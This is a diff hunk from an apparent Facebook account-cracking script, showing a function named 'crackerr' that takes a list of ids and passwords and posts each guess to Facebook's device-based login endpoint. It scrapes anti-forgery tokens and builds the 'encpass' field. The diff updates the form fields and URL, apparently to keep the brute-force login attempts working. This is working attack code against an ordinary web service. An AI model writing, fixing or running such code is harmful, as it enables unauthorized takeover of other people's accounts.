@@ -485,27 +485,14 @@ def crackerr(ids,passlist):
             log_data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'display': '',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '',
-            'signed_next': '',
-            'trynum': '1',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0^%^3D',
-            'lgnrnd': '025924_Hv1B',
-            'lgnjs': '1735383565',
             'email': ids,
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
-            'first_prefill_source': '',
-            'first_prefill_type': '',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'false',
-            'ab_test_data': '^%^2F^%^2FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPA^%^2FPPPvfBFAI',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),}
-            url = "https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
+            'cred_type': '100',
+            'login_source': 'device_based_login_add_account',
+            'savepass': '',
+            'next': '',
+            'persistent': '',
+            'encpass':"#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),}
+            url = "https://web.facebook.com/login/device-based/regular/login/"
             headers = {
             'user-agent': us,
             'Accept-Encoding': 'gzip, deflate',
